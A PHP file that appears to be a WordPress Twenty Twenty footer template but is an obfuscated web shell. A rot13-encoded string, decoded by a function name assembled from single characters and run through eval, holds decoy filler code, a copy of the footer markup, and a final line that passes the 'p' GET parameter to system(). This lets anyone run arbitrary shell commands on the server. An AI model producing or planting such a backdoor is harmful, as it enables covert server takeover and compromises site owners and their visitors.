<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qvfcynlf gur zrahf naq jvqtrgf ng gur raq bs gur znva ryrzrag.
 * Ivfhnyyl, guvf bhgchg vf cerfragrq nf cneg bs gur sbbgre ryrzrag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

$unf_sbbgre_zrah = unf_ani_zrah( 'sbbgre' );
$unf_fbpvny_zrah = unf_ani_zrah( 'fbpvny' );

$unf_fvqrone_1 = vf_npgvir_fvqrone( 'fvqrone-1' );
$unf_fvqrone_2 = vf_npgvir_fvqrone( 'fvqrone-2' );

// Bayl bhgchg gur pbagnvare vs gurer ner ryrzragf gb qvfcynl.
vs ( $unf_sbbgre_zrah || $unf_fbpvny_zrah || $unf_fvqrone_1 || $unf_fvqrone_2 ) {
	?>

	<qvi pynff=\"sbbgre-ani-jvqtrgf-jenccre urnqre-sbbgre-tebhc\">

		<qvi pynff=\"sbbgre-vaare frpgvba-vaare\">

			<?cuc

			$sbbgre_gbc_pynffrf = '';

			$sbbgre_gbc_pynffrf .= $unf_sbbgre_zrah ? ' unf-sbbgre-zrah' : '';
			$sbbgre_gbc_pynffrf .= $unf_fbpvny_zrah ? ' unf-fbpvny-zrah' : '';

			vs ( $unf_sbbgre_zrah || $unf_fbpvny_zrah ) {
				?>
				<qvi pynff=\"sbbgre-gbc<?cuc rpub $sbbgre_gbc_pynffrf; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- fgngvp bhgchg ?>\">
					<?cuc vs ( $unf_sbbgre_zrah ) { ?>

						<ani nevn-ynory=\"<?cuc rfp_ngge_r( 'Sbbgre', 'gjraglgjragl' ); ?>\" pynff=\"sbbgre-zrah-jenccre\">

							<hy pynff=\"sbbgre-zrah erfrg-yvfg-fglyr\">
								<?cuc
								jc_ani_zrah(
									neenl(
										'pbagnvare'      => '',
										'qrcgu'          => 1,
										'vgrzf_jenc'     => '%3$f',
										'gurzr_ybpngvba' => 'sbbgre',
									)
								);
								?>
							</hy>

						</ani><!-- .fvgr-ani -->

					<?cuc } ?>
					<?cuc vs ( $unf_fbpvny_zrah ) { ?>

						<ani nevn-ynory=\"<?cuc rfp_ngge_r( 'Fbpvny yvaxf', 'gjraglgjragl' ); ?>\" pynff=\"sbbgre-fbpvny-jenccre\">

							<hy pynff=\"fbpvny-zrah sbbgre-fbpvny erfrg-yvfg-fglyr fbpvny-vpbaf svyy-puvyqera-pheerag-pbybe\">

								<?cuc
								jc_ani_zrah(
									neenl(
										'gurzr_ybpngvba'  => 'fbpvny',
										'pbagnvare'       => '',
										'pbagnvare_pynff' => '',
										'vgrzf_jenc'      => '%3$f',
										'zrah_vq'         => '',
										'zrah_pynff'      => '',
										'qrcgu'           => 1,
										'yvax_orsber'     => '<fcna pynff=\"fperra-ernqre-grkg\">',
										'yvax_nsgre'      => '</fcna>',
										'snyyonpx_po'     => '',
									)
								);
								?>

							</hy><!-- .sbbgre-fbpvny -->

						</ani><!-- .sbbgre-fbpvny-jenccre -->

					<?cuc } ?>
				</qvi><!-- .sbbgre-gbc -->

			<?cuc } ?>

			<?cuc vs ( $unf_fvqrone_1 || $unf_fvqrone_2 ) { ?>

				<nfvqr pynff=\"sbbgre-jvqtrgf-bhgre-jenccre\">

					<qvi pynff=\"sbbgre-jvqtrgf-jenccre\">

						<?cuc vs ( $unf_fvqrone_1 ) { ?>

							<qvi pynff=\"sbbgre-jvqtrgf pbyhza-bar tevq-vgrz\">
								<?cuc qlanzvp_fvqrone( 'fvqrone-1' ); ?>
							</qvi>

						<?cuc } ?>

						<?cuc vs ( $unf_fvqrone_2 ) { ?>

							<qvi pynff=\"sbbgre-jvqtrgf pbyhza-gjb tevq-vgrz\">
								<?cuc qlanzvp_fvqrone( 'fvqrone-2' ); ?>
							</qvi>

						<?cuc } ?>

					</qvi><!-- .sbbgre-jvqtrgf-jenccre -->

				</nfvqr><!-- .sbbgre-jvqtrgf-bhgre-jenccre -->

			<?cuc } ?>

		</qvi><!-- .sbbgre-vaare -->

	</qvi><!-- .sbbgre-ani-jvqtrgf-jenccre -->

	<?cuc
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>